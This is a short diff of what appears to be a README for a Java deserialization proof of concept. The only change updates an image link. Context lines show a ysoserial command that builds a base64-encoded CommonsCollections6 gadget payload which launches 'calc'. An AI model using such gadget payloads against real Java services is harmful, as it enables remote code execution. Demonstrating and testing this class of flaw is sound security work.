@@ -14,7 +14,7 @@ Poc.ser: serializes Base64 encoded gadgets
 java -jar ysoserial.jar CommonsCollections6 "calc" | base64 >win-cc6-calc-poc.ser
 ```
 
-![5](./img/poc.gif)
+![gif](img/poc.gif)
 
 In short, it is equivalent to a deserialization entry. To use it, you need to have a local one.
 
